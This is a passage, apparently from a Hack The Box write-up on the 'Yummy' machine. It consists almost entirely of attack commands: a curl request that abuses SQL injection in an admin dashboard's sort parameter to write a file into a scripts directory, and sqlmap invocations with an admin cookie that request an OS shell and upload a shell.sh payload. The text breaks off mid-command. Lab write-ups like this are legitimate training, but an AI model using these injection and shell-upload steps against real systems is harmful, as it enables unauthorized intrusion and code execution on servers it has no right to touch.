...
```
curl "http://yummy.htb/admindashboard?s=aa&o=ASC%3b++select+"ping%3b"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b" -H "Cookie: X-AUTH-Token=***TOKEN-ELIMINADO***"
```

Or we can use `sqlmap` to help us get the shell of `data` (admin X-AUTH-Token is required)

```
sqlmap -u "http://yummy.htb/admindashboard?s=aa&o=ASC" --cookie="X-AUTH-Token=***TOKEN-ELIMINADO***" --data="s=aa&o=ASC" --level=5 --risk=3 --batch


sqlmap -u "http://yummy.htb/admindashboard?s=aa&o=ASC" --cookie="X-AUTH-Token=***TOKEN-ELIMINADO***" -p "o" --level=5 --risk=3 --batch --os-shell


sqlmap -u "http://yummy.htb/admindashboard?s=aa&o=ASC" --cookie="X-AUTH-Token=***TOKEN-ELIMINADO***" -p "o" --level=5 --risk=3 --batch --file-write=/opt/payloads/shell.sh --file-dest=/data/scripts/fixer-v___
